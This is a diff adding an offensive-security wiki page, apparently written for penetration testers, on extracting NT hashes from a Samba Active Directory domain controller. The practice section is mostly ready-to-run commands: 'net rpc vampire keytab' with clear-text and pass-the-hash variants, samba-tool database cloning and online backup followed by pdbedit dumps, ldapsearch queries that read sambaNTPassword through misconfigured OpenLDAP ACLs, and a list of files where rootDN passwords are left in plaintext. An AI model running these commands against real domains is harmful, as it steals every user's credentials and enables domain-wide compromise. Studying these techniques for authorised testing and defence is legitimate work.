@@ -1,0 +1,218 @@
+# Samba DCSync (Vampire)
+
+## Theory
+
+A [Samba](https://wiki.samba.org/index.php/Samba_Security_Documentation) AD DC provides a fully functional Active Directory Domain Controller on Linux, implementing core protocols such as DRSUAPI, the replication protocol used between Windows DCs to synchronise the directory database. Unlike a Windows DC, Samba does not use `ntds.dit` or VSS, so standard DCSync tools such as Impacket's `secretsdump` do not work against it out of the box.
+
+However, because Samba implements DRSUAPI, replication-based credential extraction is still possible through alternative paths that speak the same underlying protocol. The goal is identical to a [classic DCSync](../windows-and-active-directory/dcsync.md): **extract NT hashes for all domain users remotely, using only Domain Admin privileges, without requiring local code execution on the DC**.
+
+{% hint style="info" %}
+The [Samba LDB files](samba-ldb-files.md) page covers credential extraction **when you already have root on the DC**. This page focuses on the **remote, credential-only** scenario.
+{% endhint %}
+
+Three main approaches exist, depending on the Samba backend configuration:
+
+| Approach                           | Requires                          | Works against                |
+| ---------------------------------- | --------------------------------- | ---------------------------- |
+| `net rpc vampire keytab`           | Domain Admin creds or NT hash     | Samba AD DC                  |
+| `samba-tool drs clone-dc-database` | Domain Admin creds                | Samba AD DC                  |
+| `samba-tool domain backup online`  | Domain Admin creds                | Samba AD DC                  |
+| OpenLDAP attribute read            | rootDN creds or misconfigured ACL | Samba + OpenLDAP (`ldapsam`) |
+
+{% hint style="warning" %}
+The first three methods all rely on DRSUAPI replication and **do not work** when Samba uses an OpenLDAP backend (`passdb backend = ldapsam`). In that case, refer to the OpenLDAP section below.
+{% endhint %}
+
+#### How `net rpc vampire keytab` Works
+
+The `net` utility ships with most Linux distributions and exposes a `vampire keytab` subcommand originally designed for DC migrations. Under the hood it triggers a standard DRSUAPI replication transaction, the same `DsBind` → `DsCrackNames` → `DsGetNCChanges` RPC calls used by Windows DCSync, and stores the replicated secrets in a Kerberos keytab file.
+
+Keytab entries include a key typed `arcfour-hmac-md5` (RC4). In both Windows and Samba, the RC4 long-term key is **mathematically equal to the user's NT hash**, making this a direct DCSync equivalent.
+
+#### Samba + OpenLDAP Backend
+
+When Samba is configured with an OpenLDAP backend (`passdb backend = ldapsam`), the DRSUAPI-based methods above do not apply. Instead, passwords are stored in OpenLDAP-specific attributes:
+
+* **`sambaNTPassword`** — the NT hash, used for NTLM authentication.
+* **`sambaLMPassword`** — the LM hash (disabled by default in modern Samba).
+* **`userPassword`** — the bind password for LDAP authentication (SSHA, MD5, or clear text depending on config).
+
+By default, OpenLDAP ships with a minimal ACL set. The standard recommended default in the OpenLDAP documentation is:
+
+```
+access to attrs=userPassword
+  by self write
+  by anonymous auth
+  by * none
+
+access to *
+  by self write
+  by users read
+  by * none
+```
+
+The second wildcard rule (`access to * ... by users read`) grants **any authenticated LDAP user** read access to all attributes not explicitly covered by a preceding ACL. Since `sambaNTPassword` and `sambaLMPassword` are not part of the default OpenLDAP schema and are not listed in any default ACL, they fall under this wildcard — meaning **any user who can bind to LDAP can read all NT hashes**, with no admin privileges required, unless the administrator explicitly added an ACL to protect these attributes.
+
+{% hint style="warning" %}
+This is a **default-open** misconfiguration, not an exotic one. Most setup guides do recommend adding a protecting ACL, but it is frequently forgotten. Some distributions default to `by * read` (even anonymous access), making things worse.
+{% endhint %}
+
+Even when ACLs are properly set, the **rootDN password** (default: `cn=admin,dc=<domain>,dc=<tld>`) is sometimes left in plaintext in config files on domain-joined hosts, accessible to an attacker who has compromised a domain machine.
+
+## Practice
+
+#### rpc vampire
+
+{% tabs %}
+{% tab title="With clear-text password" %}
+The `--force` flag is required because `net` warns that `vampire` was not designed for use against an AD DC.
+
+```bash
+net rpc -U 'DOMAIN\administrator%Password123!' -S <DC_IP> vampire keytab /tmp/dump.tab --force
+```
+
+Then parse the NT hashes (RC4 keys) out of the keytab with `klist` (from the `krb5-user` package):
+
+```bash
+klist -k test.tab -K -e | grep arcfour-hmac | tr -s ' ' | cut -d ' ' -f 3,5 | sed 's/\ (0x/:/g' | tr -d ')'
+```
+{% endtab %}
+
+{% tab title="Pass-the-Hash" %}
+If we only have a domain admin’s NT hash we can use the modified version of `net` included in the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) repo, which adds support for the `--pw-nt-hash` parameter found in `smbclient`
+
+```bash
+pth-net rpc -U 'DOMAIN\administrator' -S <DC_IP> vampire keytab /tmp/dump.tab --force --pw-nt-hash --password=$NT_HASH
+```
+
+Then parse the NT hashes (RC4 keys) out of the keytab with `klist` (from the `krb5-user` package):
+
+```bash
+klist -k test.tab -K -e | grep arcfour-hmac | tr -s ' ' | cut -d ' ' -f 3,5 | sed 's/\ (0x/:/g' | tr -d ')'
+```
+{% endtab %}
+{% endtabs %}
+
+#### Clone the DC Database
+
+These methods replicate the entire directory, including the password database. They are slower and generate significantly more traffic in large environments, but serve as a fallback when `vampire keytab` fails.
+
+{% tabs %}
+{% tab title="drs clone-dc-database" %}
+Clone the full Samba AD database locally, including secrets:
+
+```bash
+samba-tool drs clone-dc-database <DOMAIN_FQDN> \
+  --include-secrets \
+  --targetdir=/tmp/samba-dump \
+  -W <DOMAIN_FQDN> \
+  --server=<DC_IP> \
+  -U administrator \
+  --password='Password123!'
+```
+
+Point `pdbedit` at the cloned config to extract NT hashes:
+
+```bash
+cp /tmp/samba-dump/etc/smb.conf /etc/samba/smb.conf
+pdbedit -Lw
+```
+
+Output format: `username:RID:LM_HASH:NT_HASH:::`
+{% endtab %}
+
+{% tab title="domain backup online" %}
+Create an online backup archive, same result, but requires a restore step before reading secrets, since it is supposed to be used in emergencies where you need to replace a DC.
+
+```bash
+sudo samba-tool domain backup online \
+  --targetdir=/tmp/samba-backup \
+  --server=<DC_IP> \
+  -W <DOMAIN_FQDN> \
+  -U administrator
+```
+
+Restore the backup locally (this only affects your local copy, **the target DC is completely unaffected**):
+
+```bash
+sudo samba-tool domain backup restore \
+  --backup-file=/tmp/samba-backup/*.tar.bz2 \
+  --newservername=fakeDC \
+  --targetdir=/tmp/samba-restored
+```
+
+Then read hashes from the restored config:
+
+```bash
+cp /tmp/samba-restored/etc/smb.conf /etc/samba/smb.conf
+pdbedit -Lw
+```
+
+{% hint style="success" %}
+The restore process adds your fake DC as a directory member, but only inside the local backup copy. The live environment is untouched.
+{% endhint %}
+{% endtab %}
+{% endtabs %}
+
+#### OpenLDAP Backend
+
+{% tabs %}
+{% tab title="UUnauthenticated / low-priv (misconfigured ACL)" %}
+If no explicit ACL protects `sambaNTPassword` and `sambaLMPassword`, the OpenLDAP default wildcard rule (`by users read`) allows any authenticated LDAP user to read them:
+
+```bash
+ldapsearch \
+  -H ldap://<DC_IP> \
+  -D 'cn=<USERNAME>,ou=people,dc=<DOMAIN>,dc=<TLD>' \
+  -W \
+  -b 'dc=<DOMAIN>,dc=<TLD>' \
+  -LLL '(objectClass=sambaSamAccount)' \
+  uid sambaNTPassword sambaLMPassword
+```
+
+{% hint style="info" %}
+Also check `sambaPasswordHistory`. Unlike `sambaNTPassword`, it is frequently absent from hardening guides and ACL examples. When password history is enabled, this attribute holds previous passwords (16-byte salt + NT hash), directly crackable offline.
+{% endhint %}
+{% endtab %}
+
+{% tab title="rootDN (full dump)" %}
+If you have recovered the rootDN password (see config file hunting below), dump all Samba password attributes:
+
+```bash
+ldapsearch \
+  -H ldap://<DC_IP> \
+  -D 'cn=admin,dc=<DOMAIN>,dc=<TLD>' \
+  -W \
+  -b 'dc=<DOMAIN>,dc=<TLD>' \
+  -LLL '(objectClass=sambaSamAccount)' \
+  uid sambaNTPassword userPassword sambaPasswordHistory
+```
+{% endtab %}
+{% endtabs %}
+
+#### Hunting the rootDN Password
+
+When Samba uses an OpenLDAP backend, services such as NSS, PAM, SSSD, and Kerberos must authenticate to LDAP. Administrators often use the rootDN account for this convenience, leaving its password in plaintext across domain-joined hosts.
+
+Common locations to check:
+
+```
+/etc/ldap/slapd.conf          # Older OpenLDAP — rootDNpassword sometimes in cleartext
+/etc/ldap.conf
+/etc/ldap.secret
+/etc/nslcd.conf
+/etc/sssd/sssd.conf
+/etc/openldap/ldap.conf
+/etc/krb5kdc/service.keyfile
+/etc/libnss-ldap.conf
+libnss_ldap.secret
+pam_ldap.secret
+```
+
+If the password is hashed (e.g. SSHA), attempt an offline bruteforce, OpenLDAP imposes no complexity requirement on the rootDN password by default.
+
+## Resources
+
+{% embed url="https://medium.com/@offsecdeer/how-to-dcsync-a-samba-dc-and-maybe-openldap-448c3914b17b" %}
+
+{% embed url="https://wiki.samba.org/index.php/Back_up_and_Restoring_a_Samba_AD_DC" %}
